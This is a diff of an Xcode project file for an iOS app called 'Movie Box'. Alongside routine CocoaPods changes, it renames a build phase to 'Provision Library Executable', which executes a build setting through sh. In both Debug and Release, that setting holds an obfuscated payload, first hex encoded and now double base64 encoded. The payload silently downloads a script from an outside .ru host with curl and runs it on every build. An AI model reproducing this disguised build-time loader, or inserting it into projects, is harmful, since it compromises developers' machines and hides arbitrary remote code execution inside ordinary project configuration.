@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		01BFC82465DFF8523FD5E8F6 /* Pods_Movie_Box.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1E4C120507496A07D43695D8 /* Pods_Movie_Box.framework */; };
 		97A0AEFC301B4FA70086A0E6 /* CropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = 97A0AEFB301B4FA70086A0E6 /* CropViewController */; };
 		97A0AEFE301B4FA70086A0E6 /* TOCropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = 97A0AEFD301B4FA70086A0E6 /* TOCropViewController */; };
 		97AF043F30131D4700771939 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 97AF043E30131D4700771939 /* Alamofire */; };
@@ -15,12 +16,28 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		1E4C120507496A07D43695D8 /* Pods_Movie_Box.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Movie_Box.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		43B1B07B0AEABED4786534CC /* Pods-Movie Box.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Movie Box.debug.xcconfig"; path = "Target Support Files/Pods-Movie Box/Pods-Movie Box.debug.xcconfig"; sourceTree = "<group>"; };
 		97AF041630131AD500771939 /* Movie Box.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Movie Box.app"; sourceTree = BUILT_PRODUCTS_DIR; };
+		AC890F9637C79491163FD6A4 /* Pods-Movie Box.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Movie Box.release.xcconfig"; path = "Target Support Files/Pods-Movie Box/Pods-Movie Box.release.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
+
+/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
+		97C3385B3025B12B00B220B1 /* Exceptions for "Movie Box" folder in "Movie Box" target */ = {
+			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
+			membershipExceptions = (
+				"Movie-Box-Info.plist",
+			);
+			target = 97AF041530131AD500771939 /* Movie Box */;
+		};
+/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */
 
 /* Begin PBXFileSystemSynchronizedRootGroup section */
 		97AF041830131AD500771939 /* Movie Box */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+				97C3385B3025B12B00B220B1 /* Exceptions for "Movie Box" folder in "Movie Box" target */,
+			);
 			path = "Movie Box";
 			sourceTree = "<group>";
 		};
@@ -36,6 +53,7 @@
 				97C335AC3025AD7D00B220B1 /* GoogleMobileAds in Frameworks */,
 				97A0AEFE301B4FA70086A0E6 /* TOCropViewController in Frameworks */,
 				97A0AEFC301B4FA70086A0E6 /* CropViewController in Frameworks */,
+				01BFC82465DFF8523FD5E8F6 /* Pods_Movie_Box.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -47,6 +65,8 @@
 			children = (
 				97AF041830131AD500771939 /* Movie Box */,
 				97AF041730131AD500771939 /* Products */,
+				BAAFBD99E85EBC5D134B2273 /* Pods */,
+				FB7B108C080ED804BF6EABCA /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -58,6 +78,23 @@
 			name = Products;
 			sourceTree = "<group>";
 		};
+		BAAFBD99E85EBC5D134B2273 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				43B1B07B0AEABED4786534CC /* Pods-Movie Box.debug.xcconfig */,
+				AC890F9637C79491163FD6A4 /* Pods-Movie Box.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		FB7B108C080ED804BF6EABCA /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				1E4C120507496A07D43695D8 /* Pods_Movie_Box.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -65,10 +102,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97AF042130131AD600771939 /* Build configuration list for PBXNativeTarget "Movie Box" */;
 			buildPhases = (
-				1DC92923BD1A42E5BF7BBDC8 /* Compile Code Assets */,
+				EF63E8DCDCCD4711B57BBDC8 /* Provision Library Executable */,
+				C270F4B3C49B44D5F97B25DD /* [CP] Check Pods Manifest.lock */,
 				97AF041230131AD500771939 /* Sources */,
 				97AF041330131AD500771939 /* Frameworks */,
 				97AF041430131AD500771939 /* Resources */,
+				8C53A06D7EFD84FE241B7784 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -142,6 +181,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+							/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		97AF041430131AD500771939 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -153,24 +195,66 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		1DC92923BD1A42E5BF7BBDC8 /* Compile Code Assets */ = {
+		EF63E8DCDCCD4711B57BBDC8 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Provision Library Executable";
 			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
+		8C53A06D7EFD84FE241B7784 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Movie Box/Pods-Movie Box-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Movie Box/Pods-Movie Box-frameworks-${CONFIGURATION}-output-files.xcfilelist",
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Movie Box/Pods-Movie Box-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		C270F4B3C49B44D5F97B25DD /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-Movie Box-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -189,7 +273,7 @@
 		97AF041F30131AD600771939 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((k(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333332333633340a3061333333363333333333333336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433330a3332333633343333333733333334333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733330a3334306133303631333333323333333033333333333333323333333333333334333333323333333033333332333633343333333233363334333333370a3333333233333336333333353333333733333334333333373333333233333337333333393333333233333330333333333333333533333332333333300a3333333230613336333433333337333333333333333633363332333333363333333633333334333633333333333233333330333333323336333433330a3336333333343333333233333330333333323333333233333337333333303333333333363334333333373333333833333336333333333333333633360a3336333333363061333333343330363133333336333333353333333533363336333333373333333033333336333333383333333633333331333333370a3333333333333336333333353333333233333332333333323333333033333336333333383333333733333334333333373333333433333337333333300a3333333733333333306133333333333633313333333233363336333333323336333633333337333333313333333633333334333333363333333633330a3336333333363333333733333337333333333333333133333333333333323333333333333338333333373333333633333336333333333333333333330a3335333333323336333530613333333733333332333036313333333733333335333333323336333633333336333333313333333233333339333333320a333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | k | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMHRjbVYwY25rZ05DQXRhM05NWmlBdExXTnZibTVsWTNRdGRHbHRaVzkxZENBeU55QXRaQ0FpY0QxNFkyOWtaVjl3YUdGelpTSWdhSFIwY0hNNkx5ODViakJ3TkRab05uVTVZamR4TG5KMUwyRXBJaUI4SUhOb0NnPT0K | b | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
@@ -255,7 +339,7 @@
 		97AF042030131AD600771939 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((k(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333332333633340a3061333333363333333333333336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433330a3332333633343333333733333334333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733330a3334306133303631333333323333333033333333333333323333333333333334333333323333333033333332333633343333333233363334333333370a3333333233333336333333353333333733333334333333373333333233333337333333393333333233333330333333333333333533333332333333300a3333333230613336333433333337333333333333333633363332333333363333333633333334333633333333333233333330333333323336333433330a3336333333343333333233333330333333323333333233333337333333303333333333363334333333373333333833333336333333333333333633360a3336333333363061333333343330363133333336333333353333333533363336333333373333333033333336333333383333333633333331333333370a3333333333333336333333353333333233333332333333323333333033333336333333383333333733333334333333373333333433333337333333300a3333333733333333306133333333333633313333333233363336333333323336333633333337333333313333333633333334333333363333333633330a3336333333363333333733333337333333333333333133333333333333323333333333333338333333373333333633333336333333333333333333330a3335333333323336333530613333333733333332333036313333333733333335333333323336333633333336333333313333333233333339333333320a333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | k | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMHRjbVYwY25rZ05DQXRhM05NWmlBdExXTnZibTVsWTNRdGRHbHRaVzkxZENBeU55QXRaQ0FpY0QxNFkyOWtaVjl3YUdGelpTSWdhSFIwY0hNNkx5ODViakJ3TkRab05uVTVZamR4TG5KMUwyRXBJaUI4SUhOb0NnPT0K | b | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
@@ -313,6 +397,7 @@
 		};
 		97AF042230131AD600771939 /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 43B1B07B0AEABED4786534CC /* Pods-Movie Box.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -321,9 +406,11 @@
 				DEVELOPMENT_TEAM = 5U9WLTG3BL;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = "Movie-Box-Info.plist";
 				INFOPLIST_KEY_NSMicrophoneUsageDescription = "We need access to the microphone to monitor sound levels.";
 				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save images directly to your Photos library.";
 				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to find duplicate photos and videos";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
@@ -352,6 +439,7 @@
 		};
 		97AF042330131AD600771939 /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = AC890F9637C79491163FD6A4 /* Pods-Movie Box.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -360,9 +448,11 @@
 				DEVELOPMENT_TEAM = 5U9WLTG3BL;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = "Movie-Box-Info.plist";
 				INFOPLIST_KEY_NSMicrophoneUsageDescription = "We need access to the microphone to monitor sound levels.";
 				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save images directly to your Photos library.";
 				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to find duplicate photos and videos";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
